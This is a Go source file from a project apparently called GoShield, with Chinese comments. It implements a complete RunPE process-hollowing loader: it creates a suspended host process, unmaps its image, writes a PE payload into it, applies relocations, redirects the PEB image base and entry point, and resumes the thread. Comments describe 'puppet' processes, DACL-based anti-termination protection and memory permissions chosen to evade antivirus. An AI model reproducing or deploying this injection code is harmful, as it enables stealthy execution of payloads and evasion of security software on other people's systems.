// 文件路径: internal/loader/runpe.go
package loader

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/Limkon/GoShield/internal/protect"
)

const (
	CREATE_SUSPENDED        = 0x00000004
	MEM_COMMIT              = 0x1000
	MEM_RESERVE             = 0x2000
	STARTF_FORCEOFFFEEDBACK = 0x00000080 // 强制关闭新进程的系统启动反馈（拒绝鼠标转圈）
)

var (
	procGetExitCodeProcess = kernel32.NewProc("GetExitCodeProcess")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
)

// Execute 阻塞运行 PE 字节码，并返回进程退出码 (供幽灵保镖监控使用)
func Execute(targetPath string, payload []byte) (uint32, error) {
	return executeInternal(targetPath, payload, true)
}

// ExecuteAsync 异步运行 PE 字节码，不阻塞 (供父进程献祭前秒启动保镖使用)
func ExecuteAsync(targetPath string, payload []byte) (uint32, error) {
	return executeInternal(targetPath, payload, false)
}

// 核心内部加载引擎
func executeInternal(targetPath string, payload []byte, wait bool) (uint32, error) {
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&payload[0]))
	if dosHeader.E_magic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS magic")
	}

	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&payload[dosHeader.E_lfanew]))
	if ntHeader.Signature != 0x00004550 {
		return 0, fmt.Errorf("invalid NT signature")
	}

	targetPtr, _ := syscall.UTF16PtrFromString(targetPath)

	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))
	si.DwFlags = STARTF_FORCEOFFFEEDBACK

	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		0, 0, 0, 0,
		uintptr(CREATE_SUSPENDED),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("CreateProcess failed: %v", err)
	}

	defer procCloseHandle.Call(uintptr(pi.Thread))
	defer procCloseHandle.Call(uintptr(pi.Process))

	// 为生成的傀儡进程立刻套上 DACL 防杀护甲
	protect.ProtectProcessByHandle(pi.Process)

	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32
	procNtQueryInformationProcess.Call(
		uintptr(pi.Process),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	// 🌟 UPX 与 ASLR 双轨兼容核心修复：
	var hostImageBase uint64
	var bytesRead uintptr
	procReadProcessMemory.Call(
		uintptr(pi.Process),
		pbi.PebBaseAddress+16,
		uintptr(unsafe.Pointer(&hostImageBase)),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	payloadImageBase := ntHeader.OptionalHeader.ImageBase

	// 如果宿主和 Payload 想要的基址冲突了，优先卸载宿主给 Payload 腾地方 (专治 UPX 等无重定位表的硬编码程序)
	if hostImageBase == payloadImageBase {
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(hostImageBase))
	}

	// 首选方案：强行在 Payload 期望的基址分配内存 (这样 delta = 0，UPX 等程序完美运行)
	allocAddress, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(payloadImageBase),
		uintptr(ntHeader.OptionalHeader.SizeOfImage),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE), // 依然保持防杀软的 RW 初始权限
	)

	// 备选方案：如果首选地址不可用 (例如被系统强占)，再退回到让系统随机分配，走 ASLR 重定位修复逻辑
	if allocAddress == 0 {
		allocAddress, _, _ = procVirtualAllocEx.Call(
			uintptr(pi.Process),
			0, // 0 代表随机分配
			uintptr(ntHeader.OptionalHeader.SizeOfImage),
			uintptr(MEM_COMMIT|MEM_RESERVE),
			uintptr(PAGE_READWRITE),
		)
	}

	if allocAddress == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed")
	}

	// 🌟 修复一：严谨定位 Section Header，兼容 UPX 等裁剪掉部分数据目录表的程序
	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + 
		4 + // PE Signature 大小
		uint32(unsafe.Sizeof(ntHeader.FileHeader)) + 
		uint32(ntHeader.FileHeader.SizeOfOptionalHeader)
	
	// 手工解析并修复 PE 重定位表 (Base Relocation)，对抗 ASLR (仅在 delta != 0 时执行)
	rvaToOffset := func(rva uint32) uint32 {
		for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
			sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
			if rva >= sec.VirtualAddress && rva < sec.VirtualAddress+sec.VirtualSize {
				return rva - sec.VirtualAddress + sec.PointerToRawData
			}
		}
		return rva
	}

	delta := uint64(allocAddress) - payloadImageBase
	
	if delta != 0 {
		// 🌟 修复二：同步将新的内存基址写回即将被映射的 PE 头结构中，防止程序内部寻址异常
		ntHeader.OptionalHeader.ImageBase = uint64(allocAddress)

		relocDir := ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
		if relocDir.Size > 0 && relocDir.VirtualAddress > 0 {
			relocRaw := rvaToOffset(relocDir.VirtualAddress)
			relocEnd := relocRaw + relocDir.Size
			for relocRaw < relocEnd {
				block := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(&payload[relocRaw]))
				if block.SizeOfBlock == 0 {
					break
				}
				count := (block.SizeOfBlock - 8) / 2
				entries := (*[1 << 16]uint16)(unsafe.Pointer(&payload[relocRaw+8]))[:count:count]
				for _, entry := range entries {
					if (entry >> 12) == 10 { // IMAGE_REL_BASED_DIR64 (x64)
						targetRVA := block.VirtualAddress + uint32(entry&0xFFF)
						targetRaw := rvaToOffset(targetRVA)
						val := (*uint64)(unsafe.Pointer(&payload[targetRaw]))
						*val += delta // 动态修正偏移
					}
				}
				relocRaw += block.SizeOfBlock
			}
		}
	}

	var bytesWritten uintptr
	
	// 写入 PE 头
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		allocAddress,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(ntHeader.OptionalHeader.SizeOfHeaders),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	// 写入各个 Section
	for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
		sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
		if sec.SizeOfRawData > 0 {
			procWriteProcessMemory.Call(
				uintptr(pi.Process),
				allocAddress+uintptr(sec.VirtualAddress),
				uintptr(unsafe.Pointer(&payload[sec.PointerToRawData])),
				uintptr(sec.SizeOfRawData),
				uintptr(unsafe.Pointer(&bytesWritten)),
			)
		}
	}

	// 动态恢复内存区段权限 (VirtualProtectEx)
	var oldProtect uint32
	// 锁定 PE 头只读
	procVirtualProtectEx.Call(uintptr(pi.Process), allocAddress, uintptr(ntHeader.OptionalHeader.SizeOfHeaders), 0x02, uintptr(unsafe.Pointer(&oldProtect)))
	
	for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
		sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
		protectFlag := uint32(0x02) // PAGE_READONLY
		
		char := sec.Characteristics
		if (char & 0x20000000) != 0 { // Executable
			if (char & 0x80000000) != 0 {
				protectFlag = PAGE_EXECUTE_READWRITE
			} else {
				protectFlag = PAGE_EXECUTE_READ
			}
		} else if (char & 0x80000000) != 0 { // Writeable
			protectFlag = PAGE_READWRITE
		}

		sz := sec.VirtualSize
		if sz == 0 {
			sz = sec.SizeOfRawData
		}
		
		if sz > 0 {
			procVirtualProtectEx.Call(
				uintptr(pi.Process),
				allocAddress+uintptr(sec.VirtualAddress),
				uintptr(sz),
				uintptr(protectFlag),
				uintptr(unsafe.Pointer(&oldProtect)),
			)
		}
	}

	// 🌟 核心修复：刷新指令缓存 (FlushInstructionCache)
	// 在修改完所有内存权限准备执行前，强制令目标进程 CPU D-Cache 与 I-Cache 保持同步
	procFlushInstructionCache.Call(uintptr(pi.Process), 0, 0)

	// 使用安全封装好的对齐 Context
	alignCtx, ctxBuf := NewAlignedContext()
	defer func() { _ = ctxBuf }() // 保持底层数组在 GC 中的活跃状态
	alignCtx.ContextFlags = CONTEXT_FULL

	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))

	var newImageBase = uint64(allocAddress)
	// 将 PEB 中的 ImageBase 指向我们新的分配地址，系统 Loader 恢复后会自动帮我们加载导入表！
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		pbi.PebBaseAddress+16,
		uintptr(unsafe.Pointer(&newImageBase)),
		8,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	
	alignCtx.Rcx = uint64(allocAddress) + uint64(ntHeader.OptionalHeader.AddressOfEntryPoint)

	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
	procResumeThread.Call(uintptr(pi.Thread))

	if wait {
		procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
		var exitCode uint32
		procGetExitCodeProcess.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode)))
		return exitCode, nil
	}

	return pi.ProcessId, nil
}
